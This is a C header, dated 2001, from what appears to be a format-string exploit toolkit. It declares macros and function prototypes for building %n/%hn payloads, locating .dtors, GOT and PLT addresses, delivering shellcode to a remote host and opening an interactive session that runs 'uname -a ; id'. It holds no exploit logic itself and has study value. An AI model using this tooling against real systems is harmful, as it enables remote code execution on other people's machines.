/*
 * Copyright (C) 2001 Pappy.
 * Copyright (C) 2001 Zorgon.
 * All rights reserved.
 *
 */

#ifndef __FMTB_H
#define __FMTB_H

#define OBJDUMP "/usr/bin/objdump"
#define BANNER "uname -a ; id"

#define MAX_FMT_LENGTH  128
#define MAX_OFFSET 255
#define ADD 0x100
#define FOUR 4/*sizeof( size_t )*/ * 4
#define TWO 4/*sizeof( size_t )*/ * 2
#define OCT( b0, b1, b2, b3, addr, str ) { \
	     b0 = (addr >> 24) & 0xff; \
	     b1 = (addr >> 16) & 0xff; \
	     b2 = (addr >>  8) & 0xff; \
	     b3 = (addr      ) & 0xff; \
	     if ( b0 * b1 * b2 * b3 == 0 ) { \
		     printf( "\n%s contains a NUL byte\n", str ); \
	             return( -1 ); \
	      } \
	}

typedef struct string_s {
	char * fmt;
	unsigned int base;
	unsigned int pad;
	unsigned int offset;
	size_t locaddr;
	size_t retaddr;
} string_t;

/* Prototypes */
int build_n( string_t * p_string );
int build_hn( string_t * p_string );
int build_base( char * path, string_t * p_string );
void get_addr_as_char( u_int addr, char * buf );
unsigned int get_offset( char * path );
unsigned int get_offset_remote( int sock );
unsigned long get_dtors( char * path );
unsigned long get_got( char * path, char * function );
unsigned long get_plt( char * path, char * function );
void get_addr_remote ( int sock, string_t * p_string, char * shellcode, size_t addr_stack  );
int sock_connect( char * hostname, int port );
u_long resolve( char * host );
int interact( int sock );

#endif 
